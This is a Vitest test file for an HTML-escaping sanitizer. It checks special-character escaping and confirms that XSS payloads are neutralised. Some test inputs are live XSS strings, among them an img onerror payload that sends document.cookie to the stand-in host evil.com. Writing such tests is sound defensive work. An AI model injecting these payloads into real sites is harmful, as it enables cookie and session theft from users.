import { describe, expect, it } from 'vitest'

import { escapeHtml } from '../sanitize'

describe('escapeHtml', () => {
  it('escapes ampersand', () => {
    expect(escapeHtml('Tom & Jerry')).toBe('Tom &amp; Jerry')
  })

  it('escapes less-than sign', () => {
    expect(escapeHtml('<script>')).toBe('&lt;script&gt;')
  })

  it('escapes greater-than sign', () => {
    expect(escapeHtml('a > b')).toBe('a &gt; b')
  })

  it('escapes double quotes', () => {
    expect(escapeHtml('say "hello"')).toBe('say &quot;hello&quot;')
  })

  it('escapes single quotes', () => {
    expect(escapeHtml("it's")).toBe('it&#039;s')
  })

  it('blocks XSS img onerror payload', () => {
    const payload = '<img src=x onerror=alert(document.cookie)>'
    const escaped = escapeHtml(payload)
    // Tag brackets are escaped so it cannot be parsed as HTML
    expect(escaped).not.toContain('<img')
    expect(escaped).not.toContain('>')
    expect(escaped).toContain('&lt;img')
    expect(escaped).toContain('&gt;')
  })

  it('blocks XSS script tag', () => {
    const payload = '<script>alert("xss")</script>'
    const escaped = escapeHtml(payload)
    expect(escaped).not.toContain('<script>')
    expect(escaped).toContain('&lt;script&gt;')
  })

  it('returns empty string unchanged', () => {
    expect(escapeHtml('')).toBe('')
  })

  it('returns plain text unchanged', () => {
    expect(escapeHtml('Hello World')).toBe('Hello World')
  })

  it('handles all special characters together', () => {
    const input = '& < > " \''
    const result = escapeHtml(input)
    expect(result).toBe('&amp; &lt; &gt; &quot; &#039;')
  })

  it('CERTIFICATE XSS: escapes malicious profile name', () => {
    const maliciousName =
      '<img src=x onerror=window.location="http://evil.com?cookie="+document.cookie>'
    const escaped = escapeHtml(maliciousName)
    // When injected into document.write, must not execute as HTML:
    // tag brackets are escaped, quotes are escaped — browser cannot parse it as a tag
    expect(escaped).not.toMatch(/<img/)
    expect(escaped).toContain('&lt;img')
    expect(escaped).toContain('&quot;')
    expect(escaped).toContain('&gt;')
  })
})
